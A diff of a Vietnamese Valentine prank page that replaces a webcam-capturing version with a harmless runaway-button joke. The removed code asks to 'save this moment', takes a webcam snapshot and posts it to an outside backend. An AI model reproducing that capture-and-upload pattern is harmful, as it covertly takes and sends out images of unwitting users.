@@ -2,30 +2,33 @@
 <html lang="vi">
 <head>
 <meta charset="UTF-8">
-<title>Cẩn thận bắt sáng cam 💖</title>
+<title>Valentine Troll</title>
+
 <style>
 body {
   margin: 0;
-  padding: 0;
-  height: 100vh;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
   font-family: Arial;
-  background-color: #f5c6cb; /* Nền hồng */
+  text-align: center;
+  background: #f8dede;
   overflow: hidden;
 }
 
-#gifContainer img {
-  width: 350px;
-  max-width: 80vw;
-  margin-bottom: 20px;
+.container {
+  margin-top: 100px;
 }
 
-#buttonRow {
-  display: flex;
-  gap: 20px;
+h1 {
+  color: red;
+  transition: 0.3s;
+}
+
+img {
+  width: 150px;
+  margin: 20px;
+}
+
+.buttons {
+  margin-top: 20px;
 }
 
 button {
@@ -34,130 +37,90 @@ button {
   border: none;
   border-radius: 10px;
   cursor: pointer;
-  transition: all 0.3s ease;
+  margin: 10px;
+  transition: 0.2s;
 }
 
-#yesBtn {
-  background: #28a745;
+#yes {
+  background: #4CAF50;
   color: white;
 }
 
-#noBtn {
-  background: #dc3545;
+#no {
+  background: #ff4d4d;
   color: white;
-}
-
-h1 {
-  margin-bottom: 20px;
-  color: #ff3366; /* Màu chữ hồng đậm */
+  position: absolute;
 }
 </style>
 </head>
+
 <body>
 
-<h1 id="title">Cậu có muốn Valentine cùng tớ không? 💌</h1>
+<div class="container">
+  <h1 id="text">Cậu sẽ là Valentine của tớ chứ?</h1>
+  <img id="img" src="https://media.giphy.com/media/MDJ9IbxxvDUQM/giphy.gif">
 
-<div id="gifContainer">
-  <!-- Dùng một GIF con mèo xanh dương duy nhất -->
-  <img id="mainGif" src="https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif">
+  <div class="buttons">
+    <button id="yes">Đồng ý</button>
+    <button id="no">Từ chối</button>
+  </div>
 </div>
-
-<div id="buttonRow">
-  <button id="yesBtn">Đồng ý 💖</button>
-  <button id="noBtn">Từ chối 😢</button>
-</div>
-
-<audio id="music" loop autoplay>
-  <source src="https://www.fesliyanstudios.com/play-mp3/387" type="audio/mpeg">
-</audio>
 
 <script>
-const yesBtn = document.getElementById("yesBtn");
-const noBtn = document.getElementById("noBtn");
-const mainGif = document.getElementById("mainGif");
-const title = document.getElementById("title");
+let noBtn = document.getElementById("no");
+let yesBtn = document.getElementById("yes");
+let text = document.getElementById("text");
+let img = document.getElementById("img");
 
-let hoverCount = 0;
-const maxHover = 6;
-let yesFontSize = 18;
+let scale = 1;
 
-// GIF con mèo xanh dương thay đổi mỗi lần Từ chối
-const catGif = "https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif"; // GIF mèo xanh dương
+// Hover nút "Từ chối"
+noBtn.addEventListener("mouseover", () => {
 
-// Chữ từ chối mỗi lần bấm
-const noTexts = ["Thật không? 😢", "Suy nghĩ lại đi 🥺", "Đừng mà 😭", "Bấm nhầm đúng không 😏", "Cho cơ hội đi 💔", "Lần cuối đấy 😎"];
-noBtn.addEventListener("click", () => {
-  if (hoverCount >= maxHover) return;
+  // đổi text
+  text.innerHTML = "Thôi mà, nhấn Đồng ý đi mà 🥺";
 
-  // Chuyển GIF mèo mỗi lần bấm
-  mainGif.src = catGif;
+  // nút nhỏ lại
+  scale -= 0.1;
+  noBtn.style.transform = `scale(${scale})`;
 
-  // Tăng font-size Đồng ý
-  yesFontSize += 5;
-  yesBtn.style.fontSize = yesFontSize + "px";
-
-  // Thu nhỏ nút Từ chối + thay chữ
-  noBtn.style.fontSize = (18 - 2 * hoverCount) + "px";
-  noBtn.innerText = noTexts[hoverCount % noTexts.length];
-
-  hoverCount++;
-
-  // Sau lần cuối
-  if (hoverCount === maxHover) {
-    noBtn.style.display = "none";
-    yesBtn.style.width = "auto";
-    yesBtn.style.height = "auto";
-    yesBtn.style.fontSize = "20px";
-    yesBtn.style.position = "relative";
-    yesBtn.style.top = "0";
-    yesBtn.style.left = "0";
-
-    // Thay đổi GIF sau khi bấm Đồng ý
-    mainGif.src = "https://media.giphy.com/media/l3vR1sAVgZ7TxJ7bC/giphy.gif"; // GIF mèo bị thỏ hôn
-    title.innerText = "Yeahhh!! Tớ biết mà 💖💖💖";
-  }
+  // chạy lung tung
+  let x = Math.random() * (window.innerWidth - 100);
+  let y = Math.random() * (window.innerHeight - 50);
+  noBtn.style.left = x + "px";
+  noBtn.style.top = y + "px";
 });
 
-// Bấm Đồng ý → bật camera + gửi ảnh
-yesBtn.addEventListener("click", async () => {
-  const allow = confirm("Cho tớ lưu lại khoảnh khắc này nhé? 📸");
-  if (!allow) return;
+// Bấm "Đồng ý"
+yesBtn.addEventListener("click", () => {
 
-  try {
-    const video = document.createElement("video");
-    video.autoplay = true;
-    video.style.width = "150px";
-    video.style.position = "fixed";
-    video.style.bottom = "10px";
-    video.style.right = "10px";
-    document.body.appendChild(video);
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
+  // màn hình xanh
+  document.body.innerHTML = `
+    <div style="
+      background:#4CAF50;
+      width:100vw;
+      height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      font-size:100px;
+      color:white;
+    ">
+      Đồng ý
+    </div>
+  `;
 
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext("2d");
-
-    setTimeout(async () => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imgData = canvas.toDataURL("image/png");
-
-      // Gửi ảnh lên backend Telegram
-      await fetch("https://valentine-backend.vercel.app/upload", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ image: imgData })
-      });
-
-      alert("Khoảnh khắc đã được lưu 💖");
-      stream.getTracks().forEach(t => t.stop());
-      video.remove();
-    }, 1000);
-
-  } catch (e) {
-    alert("Không bật được camera 😢");
-  }
+  // chuyển cảnh sau 1s
+  setTimeout(() => {
+    document.body.innerHTML = `
+      <div style="margin-top:100px;text-align:center;">
+        <h1 style="color:#ff4da6">
+          Yeahhh!!! Tớ biết cậu sẽ đồng ý mà ❤️❤️❤️
+        </h1>
+        <img src="https://media.giphy.com/media/3oriO0OEd9QIDdllqo/giphy.gif" width="200">
+      </div>
+    `;
+  }, 1200);
 });
 </script>
 
